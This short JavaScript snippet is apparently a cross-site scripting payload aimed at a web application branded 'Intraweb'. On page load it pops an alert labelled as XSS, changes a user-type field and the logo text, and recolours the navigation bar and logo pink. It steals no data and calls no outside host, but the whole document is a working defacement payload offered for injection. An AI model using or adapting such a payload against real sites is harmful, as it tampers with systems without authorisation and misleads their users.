window.onload = function(){alert("Some Xss meme editing");
var color = "ff00bb";
document.getElementById("MainContent_TipoUsuario").textContent = "Teste";
document.getElementsByClassName("logo-lg")[0].textContent =" Intraweb 6.9";
document.getElementsByClassName("navbar navbar-static-top")[0].style.backgroundColor = color;
document.getElementsByClassName("logo")[0].style.backgroundColor = color;
document.getElementsByClassName("logo-lg")[0].style.backgroundColor = color;
document.getElementsByClassName("sidebar-toggle")[0].style.backgroundColor = color;
                          
}
